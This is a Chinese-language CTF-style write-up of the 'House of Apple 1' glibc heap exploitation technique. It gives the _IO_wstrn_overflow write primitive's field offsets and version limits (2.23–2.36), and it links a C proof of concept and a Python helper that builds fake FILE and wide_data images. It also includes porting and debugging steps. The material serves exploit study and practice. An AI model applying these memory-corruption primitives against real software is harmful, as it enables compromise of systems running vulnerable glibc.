# House of Apple 1

## 结论

- 适用范围：**glibc 2.23～2.36；2.37 起失效**。
- 原语/效果：`_IO_wstrn_overflow` 把 fake `_IO_wstrnfile::overflow_buf` 的已知地址写入攻击者指定的 `_IO_wide_data`，一次触发产生 8 个相关指针写。
- 版本变化：2.23 可使用任意 fake primary vtable；2.24～2.36 必须让 primary vtable 指向合法的隐藏 `_IO_wstrn_jumps`；2.37 删除了该函数和 jump table。

这里必须区分名字相近的两个函数：原始 Apple1 使用 `libio/vswprintf.c` 的 `_IO_wstrn_overflow`，不是仍然存在于 `libio/wstrops.c`、负责可扩容宽字符串流的 `_IO_wstr_overflow`。因此，旧文章在 2022 年写的“所有版本”不能外推到 2.37～2.43。

<!-- PRIMITIVE_REQUIREMENTS:START -->
## 原语要求与版本边界

| 项目 | 本手法要求 |
|---|---|
| 最小输入原语 / 信息 | 可控 FILE、wide data、`_IO_wstrnfile` 尾部；可触发对应宽输出 |
| 关键环境与不变量 | libc leak；primary vtable/字段满足宽流检查 |
| 最终输出原语 | 一次产生 8 个互相关联的已知地址指针写 |
| 版本边界应如何理解 | 2.37 删除 `_IO_wstrn_overflow/_IO_wstrn_jumps`，形成消费路径硬边界；其他已知值写不等于 Apple1 存活。 |
<!-- PRIMITIVE_REQUIREMENTS:END -->

## 从源码看

在 glibc 2.36 中，`_IO_wstrn_overflow(fp, c)` 将 `fp` 转为 `_IO_wstrnfile *snf`。如果 `wide->_IO_buf_base != snf->overflow_buf`，它先调用：

```c
_IO_wsetb(fp, snf->overflow_buf, snf->overflow_buf + 64, 0);
```

然后写以下 x86-64 字段。设 `K = fake_file + 0xf0`，也就是 `snf->overflow_buf`：

| fake `_IO_wide_data` 偏移 | 字段 | 写入值 |
|---:|---|---:|
| `+0x00` | `_IO_read_ptr` | `K` |
| `+0x08` | `_IO_read_end` | `K + 0x100` |
| `+0x10` | `_IO_read_base` | `K` |
| `+0x18` | `_IO_write_base` | `K` |
| `+0x20` | `_IO_write_ptr` | `K` |
| `+0x28` | `_IO_write_end` | `K` |
| `+0x30` | `_IO_buf_base` | `K` |
| `+0x38` | `_IO_buf_end` | `K + 0x100` |

`K + 0x100` 来自 `wchar_t overflow_buf[64]`。进入 `_IO_wsetb` 前应让旧 `wide->_IO_buf_base` 为 0，或按附件确认 `_IO_FLAGS2_USER_WBUF`，否则它可能先 `free` 旧指针。

关键硬边界是提交 [`118816de3383`](https://sourceware.org/git/?p=glibc.git;a=commit;h=118816de3383ff12769349784689141355cc787c)：它进入 glibc 2.37，把 `__vswprintf_internal` 改为 `printf_buffer`，同时删除 `_IO_wstrn_overflow` 和 `_IO_wstrn_jumps`。

源码与背景：

- [glibc 2.36 `libio/vswprintf.c`](https://github.com/bminor/glibc/blob/glibc-2.36/libio/vswprintf.c)
- [glibc 2.37 `libio/vswprintf.c`](https://github.com/bminor/glibc/blob/glibc-2.37/libio/vswprintf.c)
- [House of Apple 1 原始文章](https://roderickchan.github.io/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/)

## PoC

- [`poc_known_write_2.23_2.36.c`](./poc_known_write_2.23_2.36.c)：在真实 glibc 中经 `__overflow → _IO_wstrn_overflow`，严格验证 8 个字段的写入；已实测 2.23、2.24、2.35、2.36。

fake `_IO_wstrnfile` 的完整字段关系和写入结果位于 C 文件末尾的“题目布局伪代码”，无需额外生成二进制布局文件。

## Python 离线板子

[`apple1.py`](./apple1.py) 提供 `build_house_of_apple1`，生成 Apple1 最终消费点所需的 fake FILE 和八个已知值写入。

### 函数用途

模拟 `_IO_wstrn_overflow` 的写入结果。触发 `__overflow(fp, L'A')` 后，`_IO_wstrn_overflow` 把 `fake_file + 0xf0` 的地址写入 fake `_IO_wide_data` 的多个字段。

### 对应 PoC

- [`poc_known_write_2.23_2.36.c`](./poc_known_write_2.23_2.36.c)。

### x86-64 `_IO_wstrnfile` 布局

```text
+0x000  FILE 主结构
+0x0d8  主 vtable
+0x0e0  兼容字段 1
+0x0e8  兼容字段 2
+0x0f0  overflow_buf（宽字符缓冲区）
```

`overflow_buf` 地址 `known = fake_file_addr + 0xf0` 是八个写入的共同来源。

### 最小使用示例

```python
from apple1 import build_house_of_apple1

# 占位地址：题目中换成已泄露/计算后的地址
writes = build_house_of_apple1(
    fake_file_addr=0x100000,     # fake _IO_wstrnfile
    wide_data_addr=0x200000,     # 被写入的 fake wide_data
    wstrn_jumps_addr=0x7fff0000, # 按 Build ID 解析的 _IO_wstrn_jumps
)

# 返回两个 MemoryWrite
for w in writes:
    print(w.label, hex(w.address), w.data.hex())

# writes[0] 是 fake FILE 镜像，writes[1] 是 wide_data 八个已知值写入
```

### 参数

| 参数 | 含义 |
|---|---|
| `fake_file_addr` | fake `_IO_wstrnfile` 起点；`overflow_buf` 按 `+0xf0` 计算。 |
| `wide_data_addr` | 要被写入的 fake `_IO_wide_data` 地址。 |
| `wstrn_jumps_addr` | 目标 libc 的 `_IO_wstrn_jumps` 地址，写入 `FILE+0xd8`；必须按 Build ID 解析，不能默认套用 `_IO_wfile_jumps - 0x300`。 |
| `file_mode` | FILE `_mode`，默认 1；PoC 用它保持宽字符路径。 |

### 返回对象

返回两个 `MemoryWrite`。`MemoryWrite` 每个成员含义：

| 成员 | 含义 |
|---|---|
| `address` | 要写入的绝对地址。 |
| `data` | 要写入的小端字节串（`bytes`）。 |
| `label` | 该写入的用途标签，用于调试和识别。 |

各写入内容：

```text
1. address: fake_file_addr
   data:    0xe0 字节 fake FILE 镜像
   label:   "fake _IO_wstrnfile"

2. address: wide_data_addr
   data:    0x40 字节 fake wide_data
   label:   "Apple1 wide_data known writes"
```

fake FILE 关键字段：

```text
+0xa0  _wide_data = wide_data_addr
+0xc0  _mode = file_mode
+0xd8  vtable = wstrn_jumps_addr
```

wide_data 的八个写入：

| 偏移 | 字段 | 值 |
|---|---|---|
| +0x00 | `_IO_read_ptr` | `known` |
| +0x08 | `_IO_read_end` | `known + 0x100` |
| +0x10 | `_IO_read_base` | `known` |
| +0x18 | `_IO_write_base` | `known` |
| +0x20 | `_IO_write_ptr` | `known` |
| +0x28 | `_IO_write_end` | `known` |
| +0x30 | `_IO_buf_base` | `known` |
| +0x38 | `_IO_buf_end` | `known + 0x100` |

`known + 0x100` 来自 `wchar_t overflow_buf[64]`。

### 调用者必须提供

```text
libc 基址和 _IO_wstrn_jumps 地址
可写 fake _IO_wide_data
能触发 __overflow 的宽字符路径
2.24+ 的合法 primary vtable（即 wstrn_jumps 本身）
```

### 函数不负责

```text
不把 fake FILE 挂到 _IO_list_all
不触发 __overflow
不负责恢复 flush/exit 所需的 _IO_write_base/_IO_write_ptr 等筛选字段
```

C PoC 为了跨发行版运行，使用上游 x86-64 本范围内 `_IO_wstrn_jumps = _IO_wfile_jumps - 0x300` 的关系；迁移到题目时必须从附件 libc 的隐藏 symbol/反汇编重新取偏移。

## 迁移与调试

1. 准备 fake `_IO_wstrnfile`，`_wide_data` 指向想修改的目标结构起点。
2. 2.24～2.36 的 primary vtable 必须是 `__libc_IO_vtables` 内的 `_IO_wstrn_jumps`；不要把 `_IO_wstr_jumps` 当成同一个表。
3. 若用 `exit` flush 触发，仍需控制 `_IO_list_all`/链表并满足 `write_ptr > write_base` 等筛选条件；经典 largebin 投递自身只到 2.41，但 Apple1 最终触发点已先在 2.37 消失。
4. 在 `_IO_wstrn_overflow` 与 `_IO_wsetb` 下断点，先确认不会错误 `free(target+0x30)`，再接 tcache、`mp_` 或 pointer_guard 等后续链。
